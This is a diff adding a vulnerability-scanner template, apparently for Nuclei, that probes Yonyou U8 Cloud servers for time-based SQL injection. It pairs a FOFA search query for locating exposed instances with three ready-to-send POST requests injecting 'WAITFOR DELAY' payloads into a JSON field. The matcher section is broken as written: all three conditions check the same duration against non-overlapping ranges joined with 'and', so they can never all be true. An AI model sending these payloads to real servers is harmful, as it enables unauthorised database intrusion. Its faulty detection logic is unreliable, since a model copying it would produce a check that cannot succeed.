@@ -1,0 +1,44 @@
+id: yonyou-u8cloud-verify-sqli
+ 
+info:
+  name: 用友-U8C-verify-sql注入
+  author: Abbbbb
+  severity: high
+  metadata: 
+    fofa-query: app="用友-U8-Cloud" || body="/api/uclient/public/"
+ 
+ 
+ 
+http:
+  - raw:
+      - |
+        POST /u8cuapws/rest/archive/verify HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        
+        {"orgInfo":{"code":"1';WAITFOR DELAY '0:0:2'--"}}
+      - |
+        POST /u8cuapws/rest/archive/verify HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        
+        {"orgInfo":{"code":"1';WAITFOR DELAY '0:0:4'--"}}
+      - |
+        POST /u8cuapws/rest/archive/verify HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        
+        {"orgInfo":{"code":"1';WAITFOR DELAY '0:0:6'--"}}
+ 
+ 
+ 
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>2 && duration_1<4"
+          - "duration_1>4 && duration_1<6"
+          - "duration_1>6 && duration_1<9"
